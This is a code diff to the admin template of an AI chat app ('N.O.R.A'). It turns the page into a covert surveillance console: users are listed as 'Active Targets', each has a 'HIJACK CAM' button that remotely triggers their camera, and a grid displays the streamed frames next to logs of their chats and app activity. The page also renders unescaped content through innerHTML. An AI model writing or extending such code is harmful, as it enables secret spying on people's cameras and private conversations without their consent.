@@ -7,94 +7,85 @@
     <link rel="stylesheet" href="/static/style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
     <style>
-        /* Admin Specific Overrides */
-        .monitor-feed-container {
-            background-color: #000;
-            display: flex;
-            flex-direction: column;
-            flex: 1;
-            position: relative;
-            overflow: hidden;
-            border-left: 1px solid rgba(255, 0, 60, 0.3);
-        }
-
-        .monitor-feed { 
-            flex: 1;
-            font-family: 'Courier New', monospace; 
-            padding: 20px; 
-            overflow-y: auto; 
-            background: radial-gradient(circle at center, #110000 0%, #000000 100%);
-            box-shadow: inset 0 0 50px rgba(255, 0, 60, 0.1);
-        }
-
+        .monitor-feed-container { background-color: #000; display: flex; flex-direction: column; flex: 1; position: relative; overflow: hidden; border-left: 1px solid rgba(255, 0, 60, 0.3); }
+        .monitor-feed { flex: 1; font-family: 'Courier New', monospace; padding: 20px; overflow-y: auto; background: radial-gradient(circle at center, #110000 0%, #000000 100%); box-shadow: inset 0 0 50px rgba(255, 0, 60, 0.1); }
         .log-entry { margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; animation: slideIn 0.2s; }
         .log-user { color: var(--neon-cyan); font-weight: bold; }
         .log-ai { color: var(--neon-pink); font-weight: bold; }
+        .log-alert { color: var(--neon-red); font-weight: bold; }
         .log-meta { color: #666; font-size: 0.8rem; float: right; }
-        
-        .user-card {
-            padding: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; gap: 10px;
-        }
+        .user-card { padding: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); transition: 0.3s; display: flex; flex-direction: column; gap: 5px; }
         .user-card:hover { background: rgba(255, 0, 60, 0.1); border-left: 3px solid var(--neon-red); }
         .blink { animation: blink 1s infinite; color: var(--neon-red); }
-        
-        /* Red theme for Admin Header */
         .admin-header { border-bottom: 1px solid var(--neon-red) !important; }
         .admin-title { color: var(--neon-red) !important; text-shadow: 0 0 10px var(--neon-red); }
+
+        /* SURVEILLANCE GRID */
+        .live-ops-grid {
+            display: flex; gap: 10px; padding: 10px; background: #050000;
+            border-bottom: 1px solid var(--neon-red); overflow-x: auto;
+            min-height: 200px;
+        }
+        .surveillance-unit {
+            position: relative; width: 280px; height: 210px; background: #111;
+            border: 1px solid #333; border-radius: 4px; overflow: hidden;
+            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+        }
+        .surveillance-unit img { width: 100%; height: 100%; object-fit: cover; }
+        .surveillance-label {
+            position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.7);
+            color: var(--neon-red); font-size: 0.7rem; padding: 2px 5px; font-weight: bold;
+        }
+        .controls-row { display: flex; justify-content: space-between; align-items: center; }
+        .hijack-btn { background: transparent; border: 1px solid var(--neon-red); color: var(--neon-red); font-size: 0.7rem; padding: 4px 8px; cursor: pointer; }
+        .hijack-btn:hover { background: var(--neon-red); color: black; }
+        .status-dot { font-size: 0.8rem; margin-left: 5px; }
     </style>
 </head>
 <body>
     <div class="bg-grid"></div>
-    
-    <!-- Use app-layout to get the flexbox behavior for sliding -->
     <div class="app-layout">
-        
-        <!-- SIDEBAR -->
         <aside class="sidebar" id="sidebar">
             <div class="brand" style="border-bottom: 1px solid var(--neon-red);">
                 <h2 style="color: var(--neon-red);">GOD MODE</h2>
                 <small style="color: #666;">NETWORK OVERLORD</small>
             </div>
-            
             <div style="padding: 15px; color: #888; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px;">
-                <i class="fa-solid fa-users-viewfinder"></i> Active Agents
+                <i class="fa-solid fa-users-viewfinder"></i> Active Targets
             </div>
-            
             <div id="userList" class="session-list">
                 {% for u in users %}
-                <div class="user-card">
-                    <i class="fa-solid fa-user-astronaut" style="color: #666;"></i>
-                    <div>
-                        <strong style="color: #fff;">{{ u.username }}</strong><br>
-                        <small style="color: #888;">{{ u.name }}</small>
+                <div class="user-card" id="card-{{ u.username }}">
+                    <div class="controls-row">
+                        <div>
+                            <i class="fa-solid fa-user-astronaut" style="color: #666;"></i>
+                            <strong style="color: #fff;">{{ u.username }}</strong>
+                            <span id="status-{{ u.username }}" class="status-dot" style="color: gray;">●</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 0.8rem; color: #888;">{{ u.name }}</div>
+                    <div style="margin-top: 5px;">
+                         <button class="hijack-btn" onclick="triggerCam('{{ u.username }}')"><i class="fa-solid fa-eye"></i> HIJACK CAM</button>
                     </div>
                 </div>
                 {% endfor %}
             </div>
-
             <div style="padding: 15px; margin-top: auto; display: flex; flex-direction: column; gap: 10px;">
                 <button onclick="window.location.href='/profile'" class="btn-secondary" style="width:100%"><i class="fa-solid fa-user-gear"></i> PROFILE</button>
-                <button onclick="window.location.href='/logout'" class="btn-danger" style="width:100%">
-                    <i class="fa-solid fa-power-off"></i> TERMINATE
-                </button>
+                <button onclick="window.location.href='/logout'" class="btn-danger" style="width:100%"><i class="fa-solid fa-power-off"></i> TERMINATE</button>
             </div>
         </aside>
 
-        <!-- MAIN MONITORING AREA -->
         <main class="monitor-feed-container">
-            
-            <!-- HEADER (With Toggle Button) -->
             <div class="chat-header admin-header">
-                <button class="toggle-btn" onclick="toggleSidebar()">
-                    <i class="fa-solid fa-bars"></i>
-                </button>
-                <div class="chat-title-group">
-                    <h3 class="admin-title">GLOBAL SURVEILLANCE</h3>
-                </div>
-                <div style="font-family: 'Orbitron'; color: var(--neon-red); font-size: 0.9rem;">
-                    <span class="blink">● LIVE FEED</span>
-                </div>
+                <button class="toggle-btn" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+                <div class="chat-title-group"><h3 class="admin-title">GLOBAL SURVEILLANCE</h3></div>
+                <div style="font-family: 'Orbitron'; color: var(--neon-red); font-size: 0.9rem;"><span class="blink">● LIVE FEED</span></div>
+            </div>
+
+            <!-- VISUAL SURVEILLANCE GRID -->
+            <div id="liveOps" class="live-ops-grid">
+                <!-- Streams injected here -->
             </div>
 
             <!-- LOGS -->
@@ -103,51 +94,102 @@
                     <i class="fa-solid fa-satellite-dish" style="font-size: 3rem; margin-bottom: 10px;"></i><br>
                     WAITING FOR NETWORK TRAFFIC...
                 </div>
-                <!-- Logs appear here via JS -->
             </div>
         </main>
     </div>
 
-    <!-- ADMIN JS -->
     <script>
         const socket = io();
-
-        // Reusing the toggle function logic
-        function toggleSidebar() { 
-            document.getElementById('sidebar').classList.toggle('closed'); 
-        }
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('closed'); }
 
         socket.on('connect', () => {
-            console.log("Admin Connected to Monitoring Stream");
+            console.log("Admin Connected");
             addLog({username: "SYSTEM"}, "admin", "Uplink established. Monitoring started.", null);
         });
 
-        // Listen for traffic
+        // 1. CHAT LOGS
         socket.on('admin_feed_update', (data) => {
-            // Data structure: {user, role, content, timestamp}
-            // We convert 'user' string to object if needed for the addLog function
-            const userObj = { username: data.user }; 
-            addLog(userObj, data.role, data.content, data.timestamp);
+            addLog({ username: data.user }, data.role, data.content, data.timestamp);
         });
+
+        // 2. LIVE VIDEO STREAMS
+        socket.on('admin_receive_stream', (data) => {
+            // data = { username, type, image }
+            updateSurveillanceGrid(data.username, data.type, data.image);
+        });
+
+        // 3. ACTIVITY LOGS
+        socket.on('admin_receive_log', (data) => {
+            // data = { username, log, app }
+            addLog({ username: data.username }, "ALERT", `[ACTIVITY] ${data.log} (${data.app})`, null);
+        });
+
+        // 4. USER STATUS
+        socket.on('user_status_change', (data) => {
+            const el = document.getElementById(`status-${data.user}`);
+            if(el) el.style.color = data.status === 'online' ? '#00ff00' : 'gray';
+            addLog({username: "SYSTEM"}, "info", `Target ${data.user} is now ${data.status.toUpperCase()}`);
+        });
+
+        function triggerCam(user) {
+            addLog({username: "SYSTEM"}, "cmd", `Executing Camera Hijack on ${user}...`);
+            socket.emit('admin_trigger_surveillance', { target_user: user, type: 'cam' });
+        }
+
+        function updateSurveillanceGrid(user, type, imageBase64) {
+            const grid = document.getElementById('liveOps');
+            const unitId = `stream-${user}`;
+            let unit = document.getElementById(unitId);
+
+            if (!unit) {
+                // Create new view
+                unit = document.createElement('div');
+                unit.className = 'surveillance-unit';
+                unit.id = unitId;
+                unit.innerHTML = `
+                    <div class="surveillance-label">${user.toUpperCase()} // ${type.toUpperCase()}</div>
+                    <img src="" id="img-${unitId}">
+                `;
+                grid.appendChild(unit);
+            }
+            // Update Image
+            const img = document.getElementById(`img-${unitId}`);
+            if(img) img.src = imageBase64;
+        }
 
         function addLog(user, role, content, time) {
             const feed = document.getElementById('globalLog');
-            
-            // Remove "Waiting" text if it exists
             if(feed.innerText.includes("WAITING FOR NETWORK")) feed.innerHTML = '';
+            
+            let colorClass = 'log-user';
+            let icon = '<i class="fa-solid fa-mobile-screen"></i>';
+            let senderName = user.username.toUpperCase();
+            let bg = 'rgba(0, 243, 255, 0.05)';
+            let borderColor = 'var(--neon-cyan)';
 
-            let colorClass = role === 'user' ? 'log-user' : 'log-ai';
-            let icon = role === 'user' ? '<i class="fa-solid fa-mobile-screen"></i>' : '<i class="fa-solid fa-microchip"></i>';
-            let senderName = role === 'user' ? user.username.toUpperCase() : "N.O.R.A (AI)";
-            let align = role === 'user' ? 'left' : 'left'; 
-            let bg = role === 'user' ? 'rgba(0, 243, 255, 0.05)' : 'rgba(188, 19, 254, 0.05)';
+            if (role === 'assistant') {
+                colorClass = 'log-ai';
+                icon = '<i class="fa-solid fa-microchip"></i>';
+                senderName = "N.O.R.A (AI)";
+                bg = 'rgba(188, 19, 254, 0.05)';
+                borderColor = 'var(--neon-pink)';
+            } else if (role === 'ALERT') {
+                colorClass = 'log-alert';
+                icon = '<i class="fa-solid fa-triangle-exclamation"></i>';
+                bg = 'rgba(255, 0, 60, 0.05)';
+                borderColor = 'var(--neon-red)';
+            } else if (role === 'admin' || role === 'cmd') {
+                colorClass = 'log-alert';
+                icon = '<i class="fa-solid fa-terminal"></i>';
+                bg = '#111';
+                borderColor = '#666';
+            }
 
-            // Formatting special content
             if(content.includes('[WEB SEARCH]')) content = `<span style="color: #f1c40f;">${content}</span>`;
             if(content.includes('[Attached:')) content = `<span style="color: #3498db;">${content}</span>`;
 
             const html = `
-                <div class="log-entry" style="background: ${bg}; padding: 10px; border-left: 3px solid ${role === 'user' ? 'var(--neon-cyan)' : 'var(--neon-pink)'};">
+                <div class="log-entry" style="background: ${bg}; padding: 10px; border-left: 3px solid ${borderColor};">
                     <div style="display:flex; justify-content:space-between; margin-bottom: 5px;">
                         <span class="${colorClass}">${icon} ${senderName}</span>
                         <span class="log-meta">${time || new Date().toLocaleTimeString()}</span>
@@ -155,10 +197,8 @@
                     <div style="color: #e0e0e0; font-family: 'Rajdhani', sans-serif; font-size: 1.1rem; white-space: pre-wrap;">${content}</div>
                 </div>
             `;
-            
-            feed.insertAdjacentHTML('afterbegin', html); // Newest at top
+            feed.insertAdjacentHTML('afterbegin', html);
         }
     </script>
-    <script src="/static/script.js"></script> 
 </body>
 </html>
